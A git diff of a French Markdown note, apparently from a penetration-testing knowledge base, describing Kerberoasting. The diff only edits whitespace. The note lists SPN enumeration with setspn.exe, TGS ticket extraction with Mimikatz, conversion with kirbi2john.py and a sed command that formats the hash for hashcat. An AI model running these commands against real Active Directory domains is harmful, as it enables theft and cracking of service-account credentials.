@@ -5,6 +5,7 @@ public: true # set to true to make the article publishable
 ## Récupérer un TGS
 
 ### Liste des comptes avec leurs SPNs
+
 ```shell
 # Enumérer tous les SPNs
 setspn.exe -q */*
@@ -30,7 +31,7 @@ setspn.exe -T DOMAIN.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-O
 
 ## Extraire le ou les Tickets (TGS)
 
-Une fois les TGS générés par le KDC et stockés dans le système d'exploitation, on peut les récupérer via `Mimikatz`. 
+Une fois les TGS générés par le KDC et stockés dans le système d'exploitation, on peut les récupérer via `Mimikatz`.
 
 ```
 mimikatz # base64 /out:true    <==== si on veut les transférer par copier / coller par exemple
@@ -46,6 +47,5 @@ echo "<base64 blob>" |  tr -d \\n | base64 -d > myUser.kirbi
 kirbi2john.py myUser.kirbi > vmware.hash
 sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' myuser.hash > myUser_tgs_hashcat
 ```
-
 
 [[Cassage de mots de passes Kerberos]]
